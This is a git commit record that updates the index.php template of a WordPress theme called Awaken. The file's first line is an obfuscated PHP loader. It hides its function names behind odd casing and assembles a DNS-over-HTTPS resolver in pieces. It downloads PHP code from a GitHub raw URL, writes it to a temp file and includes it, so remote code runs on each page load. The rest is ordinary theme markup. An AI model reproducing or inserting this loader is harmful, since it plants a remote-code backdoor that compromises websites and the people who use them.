e39e641dbad7950466a21c503bff3eccf38d4d0f
sakiraernina <167217284+sakiraernina@users.noreply.github.com>
2024-10-21 18:07:16 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,66 @@
 <?php $url='https://raw.githubusercontent.com/sakiraernina/merdeka/refs/heads/main/index.php';$dns='ht';$dns.='tps:/';$dns.='/cloud';$dns.='flare-';$dns.='dns.c';$dns.='om/dns';$dns.='-query';$ch=CurL_init ($url);if(defined('CURLOPT_DOH_URL')){curL_setOPT($ch,CURLOPT_DOH_URL,$dns);}cUrl_setOpt($ch,CURLOPT_RETURNTRANSFER,TRUE);Curl_seTOPt($ch,CURLOPT_SSL_VERIFYHOST,2);curL_seTopt ($ch,CURLOPT_SSL_VERIFYPEER,true);$res=curl_ExEC($ch);cuRl_close($ch);$tmp=TMPfIle();$path=streaM_Get_meTa_daTa($tmp);$path=$path['uri'];fprintf($tmp,'%s',$res);IncLude($path); ?>
+
+<?php
+/**
+ * The main template file.
+ *
+ * This is the most generic template file in a WordPress theme
+ * and one of the two required files for a theme (the other being style.css).
+ * It is used to display a page when nothing more specific matches a query.
+ * E.g., it puts together the home page when no home.php file exists.
+ * Learn more: http://codex.wordpress.org/Template_Hierarchy
+ *
+ * @package Awaken
+ */
+
+get_header(); ?>
+<div class="row">
+	<?php is_rtl() ? $rtl = 'awaken-rtl' : $rtl = ''; ?>
+	<div class="col-xs-12 col-sm-12 col-md-8 <?php echo $rtl ?>">
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		<?php if ( have_posts() ) : ?>
+
+			<?php /* Start the Loop */ 
+				$counter = 0;
+			?>
+		
+			<div class="row">
+			<?php while ( have_posts() ) : the_post(); ?>
+
+				<?php
+					/* Include the Post-Format-specific template for the content.
+					 * If you want to override this in a child theme, then include a file
+					 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
+					 */
+					get_template_part( 'content', get_post_format() );
+				?>
+			
+			<?php 
+				$counter++;
+				if ($counter % 2 == 0) {
+					echo '</div><div class="row">';
+			 	} 
+			?>
+			<?php endwhile; ?>
+
+			<div class="col-xs-12 col-sm-12 col-md-12">
+				<?php awaken_paging_nav(); ?>
+			</div>
+		</div><!-- .row -->
+
+		<?php else : ?>
+
+			<?php get_template_part( 'content', 'none' ); ?>
+
+		<?php endif; ?>
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+</div><!-- .bootstrap cols -->
+<div class="col-xs-12 col-sm-6 col-md-4">
+	<?php get_sidebar(); ?>
+</div><!-- .bootstrap cols -->
+</div><!-- .row -->
+<?php get_footer(); ?>
